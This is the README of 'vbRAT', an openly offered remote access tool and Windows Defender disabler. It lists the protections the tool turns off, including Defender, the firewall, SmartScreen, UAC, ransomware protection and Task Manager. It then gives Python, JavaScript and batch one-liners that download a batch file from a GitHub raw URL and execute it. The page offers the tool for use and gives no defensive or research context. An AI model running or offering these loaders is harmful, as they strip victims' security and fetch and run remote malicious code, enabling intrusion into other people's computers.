# vbRAT

<a href="https://open.spotify.com/user/31d72u7kl45enzfmzzjsdygltowq">
<img alt="spotify" src="https://img.shields.io/badge/-Spotify-000000?logo=Spotify&logoColor=fff"/> 
<a href="https://soundcloud.com/4ksr">
<img alt="soundcloud" src="https://img.shields.io/badge/-SoundCloud-000000?logo=SoundCloud&logoColor=fff"/>
<a href="https://t.me/oksr1">
<img alt="Telegram" src="https://img.shields.io/badge/-Telegram-000000?logo=Telegram&logoColor=fff"/>
<a href="https://discord.gg/9YV8BHj4Jq">
<img alt"Discord" src="https://img.shields.io/badge/-Discord-000000?logo=Discord&logoColor=fff"/>


---
## Defender disabler 

---
## disable defender 
 -  PUAProtection 
 -  Automatic Sample Submission
 -  Windows FireWall
 -  Windows Smart Screen(Permanently)
 -  Disable Quickscan
 -  Add exe file  to exclusions in defender settings
 -  Disable Defender Notification (Added Recently)
 -  Disable UAC(Reboot Required)
 -  Disable Ransomware Protection
 -  Disable TaskManager
 -  Disable registry etc..
---


- [Python](https://www.python.org/):

```python
import requests, os
_file = requests.get('https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat')

with open('vbrat.bat', 'w') as f:
    f.write(_file.text)

os.startfile('vbrat.bat')
```

- [Javascript](https://nodejs.org/en/):

```javascript
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');

axios.get('https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat', {
    responseType: 'text',
  }).then((response) => {
    fs.writeFileSync('vbrat.bat', response.data, { flag: 'a' }, (err) => {});
  });
exec('vbrat.bat');
```

- [Batch](https://en.wikipedia.org/wiki/Batch_file):

```batch
bitsadmin /transfer Packages /download /priority foreground https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat "vbrat.bat"
start vbrat.bat
```

